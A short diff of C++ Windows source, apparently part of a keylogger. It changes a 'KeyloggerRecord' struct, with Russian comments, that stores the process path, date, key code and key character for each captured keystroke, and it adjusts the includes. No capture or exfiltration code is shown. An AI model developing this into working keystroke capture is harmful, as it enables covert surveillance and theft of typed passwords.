@@ -10,10 +10,9 @@
 #include <commdlg.h>
 #include <shlobj.h>
 #include <ctime>
-
+#include <unordered_map>
 #include <psapi.h>
 
-//#include <iostream>
 
 using namespace std;
 
@@ -36,7 +35,7 @@ struct KeyloggerRecord {
     wstring processPath;       // Путь к запущенному процессу
     wstring dateTime;          // Дата и время действия
     int keyCode;              // Код клавиши
-    char keyChar;             // Символ клавиши
+    wstring keyChar;             // Символ клавиши
 };
 
 vector<KeyloggerRecord> keyloggerRecords;  // Глобальный контейнер для хранения записей
